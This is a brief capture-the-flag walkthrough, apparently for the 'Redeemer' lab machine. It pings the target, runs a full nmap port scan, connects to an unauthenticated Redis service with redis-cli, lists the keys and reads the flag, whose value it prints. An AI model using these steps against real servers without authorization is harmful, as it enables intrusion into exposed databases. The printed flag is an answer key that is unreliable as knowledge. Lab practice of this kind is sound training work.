![Redeemer.jpg](/assets/Tier-0/Redeemer/redeemer.jpg)

1. Send an ICMP echo request to machine's IP address..
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 2 10.129.96.90
```



2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.96.90
```

**Output**
```bash
PORT     STATE SERVICE REASON
6379/tcp open  redis   syn-ack ttl 63
```


3. Connect with **redis-cli**
```bash
redis-cli -h 10.129.96.90 -p 6379
10.129.96.90:6379>
```


4. List all keys un bdd
```bash
10.129.96.90:6379> keys *
1) "stor"
2) "flag"
3) "numb"
4) "temp"
```


5. Get "flag"
```bash
10.129.96.90:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```

**By: EsT**